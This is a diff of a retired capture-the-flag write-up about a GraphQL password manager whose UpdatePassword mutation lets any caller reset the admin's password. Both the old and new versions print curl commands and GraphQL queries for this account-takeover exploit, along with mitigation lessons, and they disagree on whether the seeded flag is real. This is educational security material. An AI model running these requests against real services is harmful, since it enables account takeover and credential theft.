@@ -11,90 +11,62 @@ tags: [web, graphql, idor, broken-access-control, source-review]
 
 **English** | [🇪🇸 Español](README.md)
 
-> **State:** Retired. Solved challenge; no real flags.
-
-## TL;DR
-
-A password manager with **source code** and a **GraphQL** API. The `UpdatePassword` mutation never checks who owns the account: **IDOR / broken access control**. Change `admin`'s password, log in as them, and the flag sits there as a stored password.
+> **State:** Retired. Analysis notes; the flag is not published.
 
 ## Brief
 
-"Pandora suspects a mole in the ministry and needs the master password, which lives in a password manager." Source is provided, and `entrypoint.sh` seeds the database.
+A password manager with a **GraphQL** API. The application's **source code** is provided (or published), so this is a review challenge, not brute force.
 
-## Analysis
+## Recon
 
 ```bash
-unzip passman.zip && cd passman
-cat entrypoint.sh
-grep -rn "GraphQL\|mutation\|UpdatePassword" --include=*.js .
+gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-`entrypoint.sh` shows the initial `INSERT`: user `admin` exists with a password that *is* the flag, and a `saved_passwords` table holds an entry for them.
+- `/` serves the frontend; `/graphql` exposes the schema.
+- With the code in hand, the schema is read straight from the resolvers and `schema.graphql`.
 
-```javascript
-// helpers/GraphqlHelper.js
-UpdatePassword: {
-  type: ResponseType,
-  args: { username: { type: new GraphQLNonNull(GraphQLString) },
-          password: { type: new GraphQLNonNull(GraphQLString) } },
-  resolve: async (root, args, request) => {
-    // no ownership check, no JWT verification for the target user
-    return db.updatePassword(args.username, args.password);
+## The flaw: `UpdatePassword` without authorisation
+
+The mutations file holds an operation that changes a user's password from a username and a new password, **without checking the caller** and without asking for the current password:
+
+```graphql
+mutation {
+  UpdatePassword(username: "admin", password: "<NEW_PASS>") {
+    message
   }
 }
 ```
 
-The mutation accepts any `username` and never compares it to the token's identity: another user's password can be changed.
-
-## Exploitation
-
-1. **Register and log in** to get a valid JWT:
+This is not a read IDOR: it is a **write mutation with no access control**. It takes over `admin`.
 
 ```bash
-curl -s -X POST http://<IP>:<port>/graphql \
+curl -s http://<IP>:<PORT>/graphql \
   -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{ RegisterUser(email:\"a@a.a\",username:\"x\",password:\"x\"){ message } }"}'
+  -d '{"query":"mutation { UpdatePassword(username: \"admin\", password: \"<NEW_PASS>\") { message } }"}'
 ```
+
+## Log in and read the flag
+
+Log in as `admin` with the new password; the flag is **inside the manager**, attached to the administrator's account.
+
+> Mind the decoy: `entrypoint.sh` seeds a fake flag into the database so the challenge "has" data. The valid one appears only after authenticating as `admin`.
 
 ```bash
-TOKEN=$(curl -s -X POST http://<IP>:<port>/graphql \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{ LoginUser(username:\"x\",password:\"x\"){ token } }"}' \
-  | jq -r '.data.LoginUser.token')
+curl -s http://<IP>:<PORT>/graphql -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer <token>" \
+  -d '{"query":"{ getPhrase(username: \"admin\") { phrase } }"}'
 ```
 
-2. **Change `admin`'s password** through the vulnerable mutation:
+## Findings
 
-```bash
-curl -s -X POST http://<IP>:<port>/graphql \
-  -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"mutation{ UpdatePassword(username:\"admin\",password:\"Pwned123!\"){ message } }"}'
-```
-
-3. **Log in as admin** and read their stored passwords:
-
-```bash
-curl -s -X POST http://<IP>:<port>/graphql \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{ LoginUser(username:\"admin\",password:\"Pwned123!\"){ token } }"}'
-```
-
-With the admin token, the saved-password query returns the flag:
-
-```graphql
-{ getPhrase(username: "admin") { address username password } }
-```
-
-## Pitfalls
-
-- **Introspection**: if disabled, the source gives exact mutation and field names.
-- **JWT**: a normal user's token is enough to call the mutation; no forging needed.
-- **Format**: GraphQL needs `Content-Type: application/json`; a form `POST` returns a syntax error.
-- **New password**: satisfy any registration policy, or the `update` fails silently.
+- The vector is **GraphQL without authorisation on a mutation**, not a classic read IDOR.
+- The password changes without the previous one and without verifying the requester's identity.
+- The container-seeded flag is noise: only the administrator's counts.
 
 ## Lessons
 
-- GraphQL brings no authorization by itself: every resolver must check resource ownership.
-- A `username` argument is an IDOR invitation; it belongs in the token, not the client.
-- Code review finds this in minutes; automated scanning almost never does.
-- Mitigation: derive the user from the JWT, enforce ownership on each mutation, and restrict introspection in production.
+- In GraphQL, review every mutation, not just the queries.
+- Credential changes must require the current password and a valid session.
+- A seeded flag is a common trap; the real target sits behind authentication.
+- Mitigation: per-resolver authorisation, mandatory `currentPassword`, and rate limiting on `/graphql`.
